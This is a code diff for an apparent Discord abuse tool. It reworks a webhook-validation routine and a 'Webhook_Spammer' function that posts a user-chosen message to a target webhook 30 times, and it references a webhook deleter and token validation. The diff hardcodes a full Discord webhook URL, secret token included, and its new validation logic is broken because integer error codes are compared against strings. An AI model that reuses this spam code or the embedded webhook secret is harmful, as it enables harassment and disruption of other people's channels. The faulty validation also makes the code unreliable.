@@ -11,7 +11,7 @@ import os
 from os import system
 console = get_console()
 
-maj = 'V4.3.1'
+maj = 'V4.3.2'
 webhook = "https://discord.com/api/webhooks/1024752077622218823/2ggeu3AOw5W_mw2FUsNSP_v0SPrZeEM5F26wZyXK6E6DKKS5yZWAtlRn0011BC4phDph"
 #please don't spam or nuke this one it's really important for the tool
 
@@ -53,19 +53,28 @@ def version():
     os.system('cls||clear')
 
 def validate_webhook(webhook):
-    stat = requests.get(webhook).json()
     try:
-        try:
-            name = stat['name']
-            name = 2
+        stat = requests.get(webhook).json()
+        print(stat)
+        try: 
+            stat = stat['name']
+            error = 3 
         except:
-            name = 1
-        if name == 2:
-            console.print('[green][[/green][purple]?[/purple][green]][/green][purple]Webhook invalid ! [/purple] ')
-            console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
-            main()
+            stat = stat['message']
+            error = 2 
     except:
-        console.print('[green][[/green][purple]?[/purple][green]][/green][purple]Webhook invalid ! [/purple] ')
+        error = 1
+    if error == "3":
+        pass
+    if error == '2':
+        console.print('[green][[/green][purple]![/purple][green]][/green][purple]Webhook invalid ! [/purple] ')
+        console.print(f"[green][[/green][purple]![/purple][green]][/green]Error = {stat}")
+        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
+        main()
+    if error == '1':
+        console.print('[green][[/green][purple]![/purple][green]][/green][purple]Webhook invalid ! [/purple] ')
+        console.print(f"[green][[/green][purple]![/purple][green]][/green]Error = Invalid URL")
+        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
         main()
 
 def validateToken(token):
@@ -219,19 +228,24 @@ def Webhook_Spammer():
         os.system(f'Title - Spyse - Webhook spamer')
         webhook = console.input('[green][[/green][purple]?[/purple][green]][/green] enter [purple]webhook[/purple] : ')
         validate_webhook(webhook)
-        Message = console.input("[green][[/green][purple]?[/purple][green]][/green] what you want to [purple]say[/purple] : ")
-        print("\"ctrl + c\" at anytime to stop\n")
-        time.sleep(1.5)
-        for i in range(30):
-            response = requests.post(
-                webhook, json = {"content" : Message}, params = {'wait' : True})
-        console.print(f'[green][[/green][purple]?[/purple][green]][/green] Spammed Webhook Successfully! ')
-        console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
-        main()
+        try:
+            Message = console.input("[green][[/green][purple]?[/purple][green]][/green] what you want to [purple]say[/purple] : ")
+            print("\"ctrl + c\" at anytime to stop\n")
+            time.sleep(1.5)
+            for i in range(30):
+                response = requests.post(
+                    webhook, json = {"content" : Message}, params = {'wait' : True})
+            console.print(f'[green][[/green][purple]?[/purple][green]][/green] Spammed Webhook Successfully! ')
+            console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
+            main()
+        except:
+            console.print("[red][[/red][purple]?[/purple][red]][/red] An error occured. . . ")
+            console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
+            main()
     except:
         console.print("[red][[/red][purple]?[/purple][red]][/red] An error occured. . . ")
         console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
-        pass
+        main()
 
 def webhook_deleter():
     try:
